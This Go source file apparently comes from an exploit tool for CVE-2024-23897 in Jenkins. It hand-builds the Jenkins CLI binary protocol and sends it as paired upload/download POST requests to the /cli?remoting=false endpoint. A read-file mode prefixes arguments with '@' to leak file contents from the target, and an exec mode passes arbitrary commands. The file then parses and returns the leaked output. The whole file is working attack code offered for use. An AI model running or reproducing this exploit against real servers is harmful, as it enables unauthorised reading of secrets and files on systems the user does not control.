package scanner

import (
	"bytes"
	"fmt"
	"github.com/google/uuid"
	"github.com/projectdiscovery/retryablehttp-go"
	"github.com/wjlin0/CVE-2024-23897/pkg/input"
	"github.com/wjlin0/CVE-2024-23897/pkg/output"
	"io"
	"strings"
	"sync"
	"time"
)

var u, _ = uuid.NewRandom()

func (s *Scanner) Exploit(target *input.Target, Mode output.Mode, args string, command string) (result *output.ResultEvent) {
	uid := u.String()
	urlpath := fmt.Sprintf("%s/cli?remoting=false", target.ToString())
	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		defer wg.Done()
		time.Sleep(1000 * time.Millisecond) // 确保 download 请求先于 upload 请求
		request, _ := retryablehttp.NewRequest("POST", urlpath, bytes.NewBuffer(parseRequestData(Mode, command, args)))
		request.Header.Add("Session", uid)
		request.Header.Add("Side", "upload")
		_, _ = s.Do(request)
	}()

	go func() {
		defer wg.Done()
		request, _ := retryablehttp.NewRequest("POST", urlpath, nil)
		request.Header.Add("Session", uid)
		request.Header.Add("Side", "download")
		resp, err := s.Do(request)
		if err != nil {
			return
		}
		defer resp.Body.Close()
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return
		}
		if len(body) > 7 && bytes.HasPrefix(body[1:len(body)-1], []byte{0x00, 0x00}) && bytes.HasSuffix(body[1:len(body)-1], []byte{0x00, 0x00, 0x00, 0x04, 0x04, 0x00, 0x00, 0x00}) {

			result = &output.ResultEvent{
				Port:    target.Port,
				Host:    target.Host,
				URL:     target.ToString(),
				Command: command,
				Args:    args,
				Mode:    Mode,
			}
			data, err := parseResponseData(Mode, command, body[1:len(body)-1])
			if err != nil {
				return
			}

			result.Response = string(data)

		}
	}()

	wg.Wait()

	return
}

//func parseResponseData(data []byte) ([]byte, error) {
//	var datas []byte
//	if len(data) < 7 {
//		return nil, fmt.Errorf("invalid length: %d", len(data))
//	}
//	for len(data) >= 7 {
//		if string(data[:7]) == "\x00\x00\x00\x04\x04\x00\x00" {
//			break
//		}
//
//		data = data[2:]
//		lengthBytes := data[:2]
//
//		// 将 lengthBytes 转换为 10 进制
//		length := binary.BigEndian.Uint16(lengthBytes)
//		if int(length)+3 > len(data) {
//			return nil, fmt.Errorf("invalid length: exceeds available data")
//		}
//
//		datas = append(datas, data[3:3+length]...)
//		data = data[3+length:]
//	}
//	return datas, nil
//}

func parseRequestData(Mode output.Mode, command string, args string) []byte {
	//dataBytes := []byte{
	//	0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x04, 0x68, 0x65, 0x6c, 0x70,
	//}

	dataBytes := []byte{}

	commandBytes := []byte{0x00, 0x00}
	commandLength := len(command)
	commandBytes = append(commandBytes, []byte{byte((commandLength + 2) >> 8), byte((commandLength + 2) & 0xff)}...)
	commandBytes = append(commandBytes, 0x00)
	commandBytes = append(commandBytes, []byte{byte(commandLength >> 8), byte(commandLength & 0xff)}...)
	commandBytes = append(commandBytes, []byte(command)...)

	argsBytes := []byte{}
	if command == "help" && Mode == output.ModeReadFile {
		argsBytes = append(argsBytes, 0x00, 0x00)
		argsLength := len("1")
		argsBytes = append(argsBytes, []byte{byte((argsLength + 2) >> 8), byte((argsLength + 2) & 0xff)}...)
		argsBytes = append(argsBytes, 0x00)
		argsBytes = append(argsBytes, []byte{byte(argsLength >> 8), byte(argsLength & 0xff)}...)
		argsBytes = append(argsBytes, []byte("1")...)
	}
	if args != "" {
		if Mode == output.ModeExec {
			argss := strings.Split(args, " ")
			for _, arg := range argss {
				argsBytes = append(argsBytes, 0x00, 0x00)
				argsLength := len(arg)
				argsBytes = append(argsBytes, []byte{byte((argsLength + 2) >> 8), byte((argsLength + 2) & 0xff)}...)
				argsBytes = append(argsBytes, 0x00)
				argsBytes = append(argsBytes, []byte{byte(argsLength >> 8), byte(argsLength & 0xff)}...)
				argsBytes = append(argsBytes, []byte(arg)...)
			}
		} else {
			argsBytes = append(argsBytes, 0x00, 0x00)
			if Mode == output.ModeReadFile && !strings.HasPrefix(args, "@") {
				args = fmt.Sprintf("@%s", args)
			}
			argsLength := len(args)
			argsBytes = append(argsBytes, []byte{byte((argsLength + 2) >> 8), byte((argsLength + 2) & 0xff)}...)
			argsBytes = append(argsBytes, 0x00)
			argsBytes = append(argsBytes, []byte{byte(argsLength >> 8), byte(argsLength & 0xff)}...)
			argsBytes = append(argsBytes, []byte(args)...)
		}

	}

	encodeStr := "UTF-8"
	encodeBytes := []byte{}
	encodeBytes = append(encodeBytes, 0x00, 0x00)
	encodeLength := len(encodeStr)
	encodeBytes = append(encodeBytes, []byte{byte((encodeLength + 2) >> 8), byte((encodeLength + 2) & 0xff)}...)
	encodeBytes = append(encodeBytes, 0x01) //  编码为 01
	encodeBytes = append(encodeBytes, []byte{byte(encodeLength >> 8), byte(encodeLength & 0xff)}...)
	encodeBytes = append(encodeBytes, []byte(encodeStr)...)

	encodeStr2 := "en_US"
	encodeBytes2 := []byte{}
	encodeBytes2 = append(encodeBytes2, 0x00, 0x00)
	encodeLength2 := len(encodeStr2)
	encodeBytes2 = append(encodeBytes2, []byte{byte((encodeLength2 + 2) >> 8), byte((encodeLength2 + 2) & 0xff)}...)
	encodeBytes2 = append(encodeBytes2, 0x01) // 01
	encodeBytes2 = append(encodeBytes2, []byte{byte(encodeLength2 >> 8), byte(encodeLength2 & 0xff)}...)
	encodeBytes2 = append(encodeBytes2, []byte(encodeStr2)...)

	dataBytes = append(dataBytes, commandBytes...)
	dataBytes = append(dataBytes, argsBytes...)
	dataBytes = append(dataBytes, encodeBytes...)
	//dataBytes = append(dataBytes, encodeBytes2...)
	dataBytes = append(dataBytes, 0x00, 0x00, 0x00, 0x00, 0x03)
	//dataBytes = append(dataBytes, 0x00, 0x00, 0x00, 0x05, 0x02, 0x00, 0x03, 0x47, 0x42, 0x4b, 0x00, 0x00, 0x00, 0x07, 0x01, 0x00, 0x05, 0x7a, 0x68, 0x5f, 0x43, 0x4e, 0x00, 0x00, 0x00, 0x00, 0x03)
	return dataBytes
}
